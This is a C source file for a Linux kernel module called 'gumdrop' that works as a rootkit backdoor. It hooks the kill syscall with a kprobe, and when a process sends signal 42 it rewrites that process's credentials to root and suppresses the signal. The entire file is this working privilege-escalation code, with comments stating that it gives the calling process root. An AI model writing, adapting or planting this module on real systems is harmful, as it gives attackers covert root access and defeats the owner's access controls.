#include <asm-generic/errno-base.h>
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/signal.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ceald");
MODULE_DESCRIPTION("gumdrop");
MODULE_VERSION("0.01");

void give_woot(pid_t target_pid) {
  struct cred *newcreds;
  struct task_struct *task;
  rcu_read_lock();
  task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
  if (!task) {
    rcu_read_unlock();
    printk(KERN_INFO "cannot grant woot to PID: %d", target_pid);
    return;
  }
  printk(KERN_INFO "giving woot to: %d (%s)\n", task->pid, task->comm);
  newcreds = prepare_creds();
  if (!newcreds) {
    rcu_read_unlock();
    printk(KERN_INFO "cannot give woot (literally 1984)\n");
    return;
  }
  printk(KERN_INFO "prepared creds :D\n");
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
  const struct cred *old = task->real_cred;
  rcu_assign_pointer(task->real_cred, newcreds);
  rcu_assign_pointer(task->cred, newcreds);
  rcu_read_unlock();
  printk(KERN_INFO "gave woot to PID: %d", current->pid);
}
static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
  unsigned long *stack = (unsigned long *)regs->sp; // skip rest of system call
  return *stack;
}
static struct kprobe kp;
static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
  int sig;
  struct pt_regs *real_regs;
  real_regs = (struct pt_regs *)regs->di;
  sig = (int)real_regs->si;
  if (sig == 42) { // if the signal code is 42
    pid_t target_pid;
    target_pid = current->pid;
    printk(KERN_INFO "the answer to everything!\n"); // 42!
    give_woot(target_pid); // give the current pid root
    regs->ax = 0;          // system call return code for kill

    regs->ip = get_syscall_return_addr(
        regs); // essentially "block" the signal from reaching the process.
    return 1;
  }

  return 0;
}

static int __init gumdrop_init(void) {
  kp.symbol_name = "__x64_sys_kill";  // specify symbol for "kill"
  kp.pre_handler = haha_funny_number; // function for when kill is detected
  int ret = register_kprobe(&kp);
  if (ret < 0) {
    printk(KERN_INFO "cannot register %d!\n", ret);
  } else {
    printk(KERN_INFO "registered!\n");
  }
  printk(KERN_INFO "Hewo pwincess!\n");
  return ret;
}

static void __exit gumdrop_exit(void) {
  unregister_kprobe(&kp);
  printk(KERN_INFO "bye!\n");
  return;
}

module_init(gumdrop_init);
module_exit(gumdrop_exit);
